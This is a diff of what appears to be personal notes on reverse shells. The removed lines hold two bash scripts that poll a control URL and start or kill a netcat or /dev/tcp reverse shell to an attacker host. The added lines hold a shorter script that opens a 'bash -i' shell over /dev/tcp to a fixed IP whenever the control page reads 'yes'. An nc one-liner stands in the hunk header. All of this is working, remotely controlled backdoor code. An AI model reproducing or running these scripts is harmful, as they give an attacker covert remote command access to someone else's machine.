@@ -140,98 +140,19 @@ nc ATTACKER_IP 4444 -e /bin/bash
 
 prefer to use tcp so that you can disable nc 
 
-Script with nc 
-
 ```
 #!/bin/bash
-
-# CONFIGURATION
 URL="https://rasenrhino.github.io/static/reverse.html"  # Control server
-SHELL_HOST="YOUR.ATTACKER.IP.HERE"                      # Replace with your attacker's IP
-SHELL_PORT=4444                                          # Port your listener is using
-
-# Function to start reverse shell
-start_shell() {
-    echo "[*] Starting reverse shell..."
-    nohup nc $SHELL_HOST $SHELL_PORT -e /bin/bash &>/dev/null &
-}
-
-# Function to stop reverse shell
-stop_shell() {
-    echo "[*] Killing reverse shell..."
-    pkill -f "nc $SHELL_HOST $SHELL_PORT"
-}
-
+SHELL_HOST="172.25.0.2"                      # Replace with your attacker's IP
+SHELL_PORT=4242 # Port your listener is using
 # Loop to check the control server
 while true; do
     response=$(curl -s "$URL")
-
+    echo $response
     if [[ "$response" == "yes" ]]; then
-        if ! pgrep -f "nc $SHELL_HOST $SHELL_PORT" >/dev/null; then
-            start_shell
-        fi
-    elif [[ "$response" == "no" ]]; then
-        if pgrep -f "nc $SHELL_HOST $SHELL_PORT" >/dev/null; then
-            stop_shell
-        fi
-    else
-        echo "[!] Unexpected response from server: $response"
+        echo "starting revshell"
+        bash -i >& /dev/tcp/$SHELL_HOST/$SHELL_PORT 0>&1
     fi
-
-    sleep 10
-done
-```
-
-Script with tcp 
-
-```
-#!/bin/bash
-
-# CONFIGURATION
-URL="https://rasenrhino.github.io/static/reverse.html"  # Control server
-SHELL_HOST="YOUR.ATTACKER.IP.HERE"                      # Your public IP
-SHELL_PORT=4444                                          # Your listener port
-SHELL_PID_FILE="/tmp/.bash_tcp_shell.pid"               # To track running shell
-
-# Function to start TCP reverse shell
-start_shell() {
-    echo "[*] Starting TCP reverse shell..."
-    bash -c "
-        exec 3<>/dev/tcp/$SHELL_HOST/$SHELL_PORT
-        while true; do
-            if ! read -r cmd <&3; then break; fi
-            out=\$(eval \"\$cmd\" 2>&1)
-            echo \"\$out\" >&3
-        done
-    " &
-    echo $! > "$SHELL_PID_FILE"
-}
-
-# Function to stop the TCP reverse shell
-stop_shell() {
-    echo "[*] Killing TCP reverse shell..."
-    if [[ -f "$SHELL_PID_FILE" ]]; then
-        kill "$(cat $SHELL_PID_FILE)" 2>/dev/null
-        rm -f "$SHELL_PID_FILE"
-    fi
-}
-
-# Loop to poll control server
-while true; do
-    response=$(curl -s "$URL")
-
-    if [[ "$response" == "yes" ]]; then
-        if [[ ! -f "$SHELL_PID_FILE" ]] || ! kill -0 "$(cat $SHELL_PID_FILE)" 2>/dev/null; then
-            start_shell
-        fi
-    elif [[ "$response" == "no" ]]; then
-        if [[ -f "$SHELL_PID_FILE" ]]; then
-            stop_shell
-        fi
-    else
-        echo "[!] Unexpected response: $response"
-    fi
-
-    sleep 10
+    sleep 5
 done
 ```
